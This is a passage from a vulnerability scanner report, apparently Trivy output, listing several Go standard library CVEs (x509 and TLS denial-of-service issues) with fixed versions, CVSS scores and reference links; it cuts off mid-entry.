│     │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
│     │      │                   processing of DNS SAN entries 
│     │      ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
│     │      │                   over all DNS Subject Alternative Name (SAN) entries. This caused
│     │      │                   strings.Split(host, ".") to execute repeatedly on the same input hostname.
│     │      │                   With a large DNS SAN list, verification costs scaled quadratically based on
│     │      │                   the number of SAN entries multiplied by the hostname's label count. Because
│     │      │                   x509.Verify validates hostnames before building the certificate chain, this
│     │      │                   overhead occurred even for untrusted certificates. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-606 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H 
│     │      │                  │         ╰ V3Score : 6.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29981 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33574 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:35832 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36317 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:38995 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:39005 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42946 
│     │      │                  ├ [31]: https://access.redhat.com/security/cve/CVE-2026-27145 
│     │      │                  ├ [32]: https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [33]: https://bugzilla.redhat.com/2484207 
│     │      │                  ├ [34]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [36]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [37]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [38]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [39]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [40]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
│     │      │                  ├ [41]: https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [42]: https://go.dev/cl/783621 
│     │      │                  ├ [43]: https://go.dev/issue/79694 
│     │      │                  ├ [44]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [45]: https://linux.oracle.com/cve/CVE-2026-27145.html 
│     │      │                  ├ [46]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [47]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
│     │      │                  ├ [48]: https://pkg.go.dev/vuln/GO-2026-5037 
│     │      │                  ├ [49]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27145
│     │      │                  │       .json 
│     │      │                  ╰ [50]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
│     │      ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ├ [23] ╭ VulnerabilityID : CVE-2026-32280 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4947 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32280 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:cc564f0789e7fd19407732df2818d83b024cbe7c868fbac86e48ac433017ba96 
│     │      ├ Title           : crypto/x509: crypto/tls: golang: Go: Denial of Service vulnerability in
│     │      │                   certificate chain building 
│     │      ├ Description     : During chain building, the amount of work that is done is not correctly
│     │      │                   limited when a large number of intermediate certificates are passed in
│     │      │                   VerifyOptions.Intermediates, which can lead to a denial of service. This
│     │      │                   affects both direct users of crypto/x509 and users of crypto/tls. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:10217 
│     │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:10219 
│     │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:10704 
│     │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:11507 
│     │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:11514 
│     │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:11688 
│     │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:13545 
│     │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:13791 
│     │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:13826 
│     │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:13829 
│     │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:14020 
│     │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:14162 
│     │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:14391 
│     │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:15980 
│     │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:16021 
│     │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:16024 
│     │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:16101 
│     │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:16476 
│     │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:16477 
│     │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:16505 
│     │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:16508 
│     │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:16532 
│     │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:16534 
│     │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:16535 
│     │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:16537 
│     │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:16542 
│     │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:16874 
│     │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:16875 
│     │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:17084 
│     │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:17287 
│     │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:18027 
│     │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:18032 
│     │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:19133 
│     │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:19135 
│     │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:19144 
│     │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:19350 
│     │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:19353 
│     │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:19375 
│     │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:19450 
│     │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:19550 
│     │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:19634 
│     │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:19714 
│     │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:19715 
│     │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:19719 
│     │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:19720 
│     │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:19721 
│     │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:19722 
│     │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:19750 
│     │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:19839 
│     │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:20556 
│     │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:20569 
│     │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:20570 
│     │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:20571 
│     │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:20607 
│     │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:20608 
│     │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:20609 
│     │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:20889 
│     │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:21017 
│     │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:21338 
│     │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:21655 
│     │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:21769 
│     │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:21772 
│     │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:22130 
│     │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:22141 
│     │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:22258 
│     │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:22260 
│     │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:22268 
│     │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:22309 
│     │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:22347 
│     │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:22415 
│     │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:22422 
│     │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:22465 
│     │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:22485 
│     │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:22709 
│     │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:22713 
│     │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:22840 
│     │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:22862 
│     │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:22958 
│     │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:22959 
│     │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:22960 
│     │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:22961 
│     │      │                  ├ [82] : https://access.redhat.com/errata/RHSA-2026:22962 
│     │      │                  ├ [83] : https://access.redhat.com/errata/RHSA-2026:23102 
│     │      │                  ├ [84] : https://access.redhat.com/errata/RHSA-2026:23103 
│     │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:23244 
│     │      │                  ├ [86] : https://access.redhat.com/errata/RHSA-2026:23345 
│     │      │                  ├ [87] : https://access.redhat.com/errata/RHSA-2026:23361 
│     │      │                  ├ [88] : https://access.redhat.com/errata/RHSA-2026:24337 
│     │      │                  ├ [89] : https://access.redhat.com/errata/RHSA-2026:24359 
│     │      │                  ├ [90] : https://access.redhat.com/errata/RHSA-2026:24470 
│     │      │                  ├ [91] : https://access.redhat.com/errata/RHSA-2026:24478 
│     │      │                  ├ [92] : https://access.redhat.com/errata/RHSA-2026:24716 
│     │      │                  ├ [93] : https://access.redhat.com/errata/RHSA-2026:24761 
│     │      │                  ├ [94] : https://access.redhat.com/errata/RHSA-2026:24762 
│     │      │                  ├ [95] : https://access.redhat.com/errata/RHSA-2026:24853 
│     │      │                  ├ [96] : https://access.redhat.com/errata/RHSA-2026:24977 
│     │      │                  ├ [97] : https://access.redhat.com/errata/RHSA-2026:25089 
│     │      │                  ├ [98] : https://access.redhat.com/errata/RHSA-2026:25127 
│     │      │                  ├ [99] : https://access.redhat.com/errata/RHSA-2026:25180 
│     │      │                  ├ [100]: https://access.redhat.com/errata/RHSA-2026:26447 
│     │      │                  ├ [101]: https://access.redhat.com/errata/RHSA-2026:26568 
│     │      │                  ├ [102]: https://access.redhat.com/errata/RHSA-2026:26571 
│     │      │                  ├ [103]: https://access.redhat.com/errata/RHSA-2026:26585 
│     │      │                  ├ [104]: https://access.redhat.com/errata/RHSA-2026:26636 
│     │      │                  ├ [105]: https://access.redhat.com/errata/RHSA-2026:27076 
│     │      │                  ├ [106]: https://access.redhat.com/errata/RHSA-2026:28038 
│     │      │                  ├ [107]: https://access.redhat.com/errata/RHSA-2026:28047 
│     │      │                  ├ [108]: https://access.redhat.com/errata/RHSA-2026:28074 
│     │      │                  ├ [109]: https://access.redhat.com/errata/RHSA-2026:28196 
│     │      │                  ├ [110]: https://access.redhat.com/errata/RHSA-2026:28198 
│     │      │                  ├ [111]: https://access.redhat.com/errata/RHSA-2026:28441 
│     │      │                  ├ [112]: https://access.redhat.com/errata/RHSA-2026:28886 
│     │      │                  ├ [113]: https://access.redhat.com/errata/RHSA-2026:28961 
│     │      │                  ├ [114]: https://access.redhat.com/errata/RHSA-2026:29035 
│     │      │                  ├ [115]: https://access.redhat.com/errata/RHSA-2026:29195 
│     │      │                  ├ [116]: https://access.redhat.com/errata/RHSA-2026:29455 
│     │      │                  ├ [117]: https://access.redhat.com/errata/RHSA-2026:29702 
│     │      │                  ├ [118]: https://access.redhat.com/errata/RHSA-2026:29703 
│     │      │                  ├ [119]: https://access.redhat.com/errata/RHSA-2026:29854 
│     │      │                  ├ [120]: https://access.redhat.com/errata/RHSA-2026:33722 
│     │      │                  ├ [121]: https://access.redhat.com/errata/RHSA-2026:34097 
│     │      │                  ├ [122]: https://access.redhat.com/errata/RHSA-2026:34192 
│     │      │                  ├ [123]: https://access.redhat.com/errata/RHSA-2026:34196 
│     │      │                  ├ [124]: https://access.redhat.com/errata/RHSA-2026:34197 
│     │      │                  ├ [125]: https://access.redhat.com/errata/RHSA-2026:34365 
│     │      │                  ├ [126]: https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [127]: https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [128]: https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [129]: https://access.redhat.com/errata/RHSA-2026:39810 
│     │      │                  ├ [130]: https://access.redhat.com/errata/RHSA-2026:39894 
│     │      │                  ├ [131]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [132]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [133]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [134]: https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [135]: https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [136]: https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [137]: https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [138]: https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [139]: https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [140]: https://access.redhat.com/errata/RHSA-2026:9385 
│     │      │                  ├ [141]: https://access.redhat.com/security/cve/CVE-2026-32280 
│     │      │                  ├ [142]: https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [143]: https://bugzilla.redhat.com/2456333 
│     │      │                  ├ [144]: https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [145]: https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [146]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│     │      │                  ├ [147]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [148]: https://bugzilla.redhat.com/show_bug.cgi?id=2456333 
│     │      │                  ├ [149]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [150]: https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [151]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
│     │      │                  ├ [152]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [153]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
│     │      │                  ├ [154]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [155]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [156]: https://errata.almalinux.org/9/ALSA-2026-29703.html 
│     │      │                  ├ [157]: https://errata.rockylinux.org/RLSA-2026:33722 
│     │      │                  ├ [158]: https://go.dev/cl/758320 
│     │      │                  ├ [159]: https://go.dev/issue/78282 
│     │      │                  ├ [160]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [161]: https://linux.oracle.com/cve/CVE-2026-32280.html 
│     │      │                  ├ [162]: https://linux.oracle.com/errata/ELSA-2026-33722.html 
│     │      │                  ├ [163]: https://nvd.nist.gov/vuln/detail/CVE-2026-32280 
│     │      │                  ├ [164]: https://pkg.go.dev/vuln/GO-2026-4947 
│     │      │                  ├ [165]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3228
│     │      │                  │        0.json 
│     │      │                  ╰ [166]: https://www.cve.org/CVERecord?id=CVE-2026-32280 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.247Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:24.89Z 
│     ├ [24] ╭ VulnerabilityID : CVE-2026-32281 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4946 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32281 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:aba131436ee0c769c0d492590ad2c32f3ef6b98eb3c2b724665766d53f6de480 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Denial of Service via inefficient
│     │      │                   certificate chain validation 
│     │      ├ Description     : Validating certificate chains which use policies is unexpectedly inefficient
│     │      │                   when certificates in the chain contain a very large number of policy mappings,
│     │      │                    possibly causing denial of service. This only affects validation of otherwise
│     │      │                    trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 5.9 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29703 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32281 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456333 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2456333 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
│     │      │                  ├ [12]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [13]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
│     │      │                  ├ [14]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [16]: https://errata.almalinux.org/9/ALSA-2026-29703.html 
│     │      │                  ├ [17]: https://errata.rockylinux.org/RLSA-2026:33722 
│     │      │                  ├ [18]: https://go.dev/cl/758061 
│     │      │                  ├ [19]: https://go.dev/issue/78281 
│     │      │                  ├ [20]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [21]: https://linux.oracle.com/cve/CVE-2026-32281.html 
│     │      │                  ├ [22]: https://linux.oracle.com/errata/ELSA-2026-33722.html 
│     │      │                  ├ [23]: https://nvd.nist.gov/vuln/detail/CVE-2026-32281 
│     │      │                  ├ [24]: https://pkg.go.dev/vuln/GO-2026-4946 
│     │      │                  ╰ [25]: https://www.cve.org/CVERecord?id=CVE-2026-32281 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.35Z 
│     │      ╰ LastModifiedDate: 2026-07-25T10:10:00.167Z 
│     ├ [25] ╭ VulnerabilityID : CVE-2026-32283 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4870 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32283 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:2ec2b75f561cfa73766ca019f46266a346037a622750895c8eb81057048ab4b0 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Denial of Service via multiple TLS 1.3 key
│     │      │                   update messages 
│     │      ├ Description     : If one side of the TLS connection sends multiple key update messages
│     │      │                   post-handshake in a single record, the connection can deadlock, causing
│     │      │                   uncontrolled consumption of resources. This can lead to a denial of service.
│     │      │                   This only affects TLS 1.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-770 
│     │      │                  ╰ [1]: CWE-764 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:10217 
│     │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:10219 
│     │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:10704 
│     │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:11507 
│     │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:11514 
│     │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:11704 
│     │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:11711 
│     │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:11712 
│     │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:11863 
│     │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:11881 
│     │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:14162 
│     │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:14391 
│     │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:15980 
│     │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:16021 
│     │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:16024 
